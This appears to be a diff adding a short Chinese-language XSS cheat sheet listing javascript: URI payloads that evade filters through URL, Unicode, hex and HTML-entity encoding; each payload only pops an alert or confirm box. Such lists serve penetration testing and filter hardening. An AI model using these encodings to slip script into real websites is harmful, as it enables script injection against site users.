@@ -1,0 +1,10 @@
+xss总结
+
+下面是目前可用的几种编码绕过的方式
+
+javascript:%61%6c%65%72%74%28%31%29         # url编码
+javascript:confirm`1`
+javascript:confirm(1)
+javascript:\u0061\u006C\u0065\u0072\u0074(1)            # unicode编码
+javascript:eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")     # 十六进制
+javascript:eval("&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#120;&#115;&#115;&#39;&#41;")  # html编码
